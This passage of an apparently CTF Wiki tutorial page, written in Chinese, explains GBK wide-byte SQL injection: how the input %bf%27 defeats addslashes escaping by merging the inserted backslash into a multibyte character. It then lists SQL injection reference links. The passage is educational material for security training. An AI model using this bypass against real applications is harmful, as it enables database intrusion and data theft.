+<h3>宽字节注入<a class="headerlink" href="#id18" title="永久链接至标题">¶</a></h3>
+<p>国内最常使用的 GBK 编码，这种方式主要是绕过 <code class="docutils literal"><span class="pre">addslashes</span></code> 等对特殊字符进行转移的绕过。反斜杠 <code class="docutils literal"><span class="pre">\</span></code> 的十六进制为 <code class="docutils literal"><span class="pre">%5c</span></code>，在你输入 <code class="docutils literal"><span class="pre">%bf%27</span></code> 时，函数遇到单引号自动转移加入 <code class="docutils literal"><span class="pre">\</span></code>，此时变为 <code class="docutils literal"><span class="pre">%bf%5c%27</span></code>，<code class="docutils literal"><span class="pre">%bf%5c</span></code> 在 GBK 中变为一个宽字符「縗」。<code class="docutils literal"><span class="pre">%bf</span></code> 那个位置可以是 <code class="docutils literal"><span class="pre">%81-%fe</span></code> 中间的任何字符。不止在 SQL 注入中，宽字符注入在很多地方都可以应用。</p>
+</div>
+</div>
+<div class="section" id="id19">
+<h2>参考资料<a class="headerlink" href="#id19" title="永久链接至标题">¶</a></h2>
+<ul class="simple">
+<li><a class="reference external" href="http://static.hx99.net/static/drops/tips-7840.html">SQL 注入速查表</a></li>
+<li><a class="reference external" href="http://static.hx99.net/static/drops/tips-7299.html">MySQL 注入技巧</a></li>
+<li><a class="reference external" href="http://static.hx99.net/static/drops/tips-123.html">MySQL 注入科普</a></li>
+<li><a class="reference external" href="http://www.91ri.org/4073.html">MySQL 注入总结</a></li>
+<li><a class="reference external" href="http://product.dangdang.com/23364650.html">《SQL 注入攻击与防御》</a></li>
+</ul>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="xss.html" class="btn btn-neutral float-right" title="XSS 跨站脚本攻击" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="index.html" class="btn btn-neutral" title="WEB 简介" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, CTF Wiki.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="../_static/translations.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
